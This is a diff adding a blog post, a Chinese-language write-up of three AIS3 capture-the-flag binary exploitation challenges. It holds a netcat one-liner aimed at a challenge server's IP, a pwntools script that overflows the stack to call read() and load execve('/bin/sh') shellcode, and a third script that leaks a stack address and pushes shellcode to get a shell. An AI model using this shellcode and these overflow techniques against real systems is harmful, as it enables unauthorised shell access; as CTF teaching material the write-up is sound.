@@ -1,0 +1,110 @@
+---
+layout: post
+title:  "AIS3 pwn"
+categories: writeup
+tags: [pwn]
+---
+簡單紀錄一下
+
+## PWN1
+丟進ida 可以看到
+
+```
+if ( v4 == 0x90909090 )
+result = puts(aCensordCensord);
+else
+result = printf("Your point is only %d, try hard!\n", v4, v1,
+v2, v3);
+return result;
+```
+
+直接塞90結束
+
+```
+python -c 'print "\x90"*1000' | nc 52.69.163.194 1111
+```
+
+## PWN2
+
+定位到地20個字以後可以控制eip
+
+```
+gdb-peda$ info functions
+All defined functions:
+Non-debugging symbols:
+0x08048364  _init
+0x080483a0  read@plt
+```
+
+可以指到`read`上,一般來說長這樣
+
+
+```
+call
+ret
+argv1
+￼argv2
+argv3
+```
+
+可以控制`read`的返回地址跟參數,所以可以把`ret`跟我們shellcode 指到同一個位置上,shellcode的話隨便找一段空⽩白的地⽅方寫上去就好
+
+```python
+from pwn import *
+import time
+r = remote('127.0.0.1', 4000)
+read_adr = "\xa0\x83\x04\x08"
+read = "\x00\x00\x00\x00" + "\x00\xa1\x04\x08" + "\x00\x01\x00\x00"
+p = "a"*20 + read_adr + "\x00\xa1\x04\x08" + read
+r.send (p)
+time.sleep(5)
+r.send ("\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd
+\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68")
+```
+
+## PWN3
+
+滿多東西始用 qira看的 pwn3首先可以一直`push`來達成覆蓋`ret`的效果最後要exit退出達成覆蓋
+一開始算一下 `pop leak` 的值跟我們shellcode 差多遠,計算以後差 36 ,但是會覆蓋 ret 所以ret 以後要給他一個指標 指向我們的shellcode
+⽤用`%d`的話超過`0x80000000` 要剪掉 `0x100000000`塞進去的職才會是正常的 我們的payload預計長這樣
+
+```
+point to shellcode + shellcode + nop + ret
+```
+
+
+``` python
+from pwn import *
+import time
+r = remote('127.0.0.1',4000)
+def push(num):
+     r.send('1\n')
+     time.sleep(0.2)
+     if num > 0x80000000:
+           num -= 0x100000000
+     r.send( str(num) + '\n')
+#pop leak
+r.send('2\n')
+item = r.recvline_contains('item')[13:23]
+shell_adr = int(item,16) - 36 + 4
+#shellcode point
+push(shell_adr)
+#shellcode
+push(0x315b0beb)
+push(0x31c931c0)
+push(0xcd0bb0d2)
+push(0xfff0e880)
+push(0x622fffff)
+push(0x732f6e69)
+push(0x90900068)
+#nop
+for _ in range (0,16):
+     push(0x90909090)
+#ret
+push(shell_adr)
+#exit
+time.sleep(1)
+r.send('4\n')
+#get shell
+r.interactive()
+```
